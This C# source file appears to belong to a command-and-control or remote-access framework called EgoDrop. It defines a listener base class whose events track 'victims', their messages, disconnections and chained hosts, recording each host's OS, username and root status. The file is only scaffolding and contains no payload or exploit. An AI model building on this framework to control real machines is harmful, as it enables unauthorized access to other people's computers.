using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace EgoDrop
{
    public class clsListener
    {
        protected string m_szName { get; set; } //Listener's name.
        protected int m_nPort { get; set; }
        protected string m_szDescription { get; set; }
        protected clsSqlite.enListenerProtocol m_Protocol { get; set; }

        public clsSqlite.stListener m_stListener { get; set; }
        public bool m_bIsListening { get; set; }

        public delegate void dlgNewVictim(clsListener listener, clsAgent agent);
        public event dlgNewVictim evtNewVictim;
        public delegate void dlgReceivedMessage(clsListener listener, clsVictim victim, string szSrcVictimID, List<string> lsMsg);
        public event dlgReceivedMessage evtReceivedMessage;
        public delegate void dlgVictimDisconnected(clsListener listener, clsVictim victim, string szVictimID);
        public event dlgVictimDisconnected evtVictimDisconnected;
        public delegate void dlgAddChain(clsListener listemer, clsVictim victim, List<string> lsVictim, string szOS, string szUsername, bool bRoot, string szIPv4, NetworkView.enConnectionType enProtocol);
        public event dlgAddChain evtAddChain;

        public clsListener()
        {
            
        }

        public virtual void fnStart()
        {
            
        }

        public virtual void fnStop()
        {

        }

        /// <summary>
        /// Add new agent.
        /// </summary>
        /// <param name="agent">Agent object.</param>
        public void fnOnNewVictim(clsAgent agent)
        {
            evtNewVictim?.Invoke(this, agent);
        }

        /// <summary>
        /// Victim's message handler.
        /// </summary>
        /// <param name="victim"></param>
        /// <param name="szSrcVictimID"></param>
        /// <param name="lsMsg"></param>
        public void fnOnReceivedMessage(clsVictim victim, string szSrcVictimID, List<string> lsMsg)
        {
            evtReceivedMessage?.Invoke(this, victim, szSrcVictimID, lsMsg);
        }

        /// <summary>
        /// Victim disconnect event.
        /// </summary>
        /// <param name="victim"></param>
        /// <param name="szVictimID"></param>
        public void fnOnVictimDisconnected(clsVictim victim, string szVictimID)
        {
            evtVictimDisconnected?.Invoke(this, victim, szVictimID);
        }

        /// <summary>
        /// Add new victim chain.
        /// </summary>
        /// <param name="lsVictim"></param>
        /// <param name="szOS"></param>
        /// <param name="szUsername"></param>
        /// <param name="bRoot"></param>
        /// <param name="szIPv4"></param>
        public void fnOnAddChain(clsListener listener, clsVictim victim, List<string> lsVictim, string szOS, string szUsername, bool bRoot, string szIPv4, NetworkView.enConnectionType enProtocol)
        {
            evtAddChain?.Invoke(listener, victim, lsVictim, szOS, szUsername, bRoot, szIPv4, enProtocol);
        }
    }
}
